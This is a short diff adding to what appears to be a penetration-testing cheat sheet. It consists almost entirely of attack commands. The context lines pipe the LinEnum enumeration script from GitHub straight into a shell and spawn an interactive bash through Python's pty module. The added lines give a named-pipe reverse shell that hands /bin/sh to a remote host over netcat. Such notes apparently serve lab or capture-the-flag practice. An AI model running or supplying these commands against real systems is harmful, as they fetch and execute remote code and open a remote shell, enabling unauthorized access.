@@ -38,3 +38,9 @@ curl -s https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh |
 ```bash
 echo "import pty; pty.spawn('/bin/bash')" > /tmp/shell.py && python /tmp/shell.py
 ```
+
+### Reverse Shell w/ max compatibility
+
+```bash
+rm /tmp/backpipe; mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | nc 10.10.14.11 4445 1>/tmp/backpipe
+```
